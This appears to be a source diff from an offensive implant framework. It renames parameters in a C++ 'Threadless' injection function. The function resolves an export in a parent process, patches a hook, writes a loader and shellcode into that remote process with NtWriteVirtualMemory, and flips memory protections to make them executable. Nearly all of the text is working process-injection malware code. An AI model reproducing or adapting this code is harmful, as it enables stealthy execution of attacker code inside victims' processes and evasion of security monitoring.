@@ -4,7 +4,7 @@
 
 namespace Injection {
 
-    VOID Threadless(_threadless threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T cbFullSize) {
+    VOID Threadless(_threadless threadless, void *shellcode, size_t n_shellcode, size_t total_length) {
         HEXANE
 
         // todo: needs MmPivotRegion (Flower) :
@@ -18,7 +18,7 @@ namespace Injection {
 
         if (!(ex_addr = Memory::Modules::GetExportAddress(S_CAST(LPSTR, threadless.Module.Buffer), R_CAST(LPSTR, threadless.Export.Buffer))) ||
             !(process = Process::GetParentHandle(R_CAST(PBYTE, threadless.Parent.Buffer))) ||
-            !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), cbShellcode))) {
+            !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), n_shellcode))) {
             return;
         }
 
@@ -30,21 +30,21 @@ namespace Injection {
         Memory::PatchMemory(B_PTR(threadless.Opcode.Buffer), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);
 
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID*, &ex_addr_p), &cbFullSize, PAGE_EXECUTE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID*, &ex_addr_p), &total_length, PAGE_EXECUTE_READWRITE, nullptr)) ||
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, threadless.Opcode.Buffer), threadless.Opcode.Length, &write)) || write != threadless.Opcode.Length) {
             return_defer(ntstatus);
         }
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook_p), &cbFullSize, PAGE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook_p), &total_length, PAGE_READWRITE, nullptr)) ||
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), threadless.Loader.Buffer, threadless.Loader.Length, &write)) || write != threadless.Loader.Length) {
             return_defer(ntstatus);
         }
 
-        //Xtea::XteaCrypt(R_CAST(PBYTE, Shellcode), cbShellcode, Ctx->Config.Key, FALSE);
+        //Xtea::XteaCrypt(R_CAST(PBYTE, Shellcode), n_shellcode, Ctx->Config.Key, FALSE);
 
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + threadless.Loader.Length), Shellcode, cbShellcode, &write)) || write != cbShellcode ||
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook), &cbShellcode, PAGE_EXECUTE_READ, nullptr))) {
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + threadless.Loader.Length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
             return_defer(ntstatus);
         }
 
